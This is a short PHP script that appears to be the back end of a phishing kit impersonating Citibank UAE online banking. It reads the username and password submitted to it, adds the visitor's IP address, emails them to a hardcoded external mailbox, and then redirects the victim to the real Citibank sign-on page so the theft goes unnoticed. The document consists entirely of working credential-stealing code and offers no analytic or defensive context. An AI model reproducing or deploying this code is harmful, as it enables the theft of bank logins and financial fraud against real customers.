<?php
    ini_set( 'display_errors', 1 );
    error_reporting( E_ALL );
    $from = "mrkenneymartins@zoho.com";
    $to = "mrkenneymartins@zoho.com";
    $subject = "30BN container";
    $message = "username: " . $_POST['username'] . ' | ' . "password: " . $_POST['password'] . ' | ' . "ip: " . $_SERVER['REMOTE_ADDR'];
    $headers = "From:" . $from;
    mail($to,$subject,$message, $headers);
echo '<script type="text/javascript">
           window.location = "https://online.citibank.ae/AEGCB/JSO/signon/DisplayUsernameSignon.do"
      </script>';
?>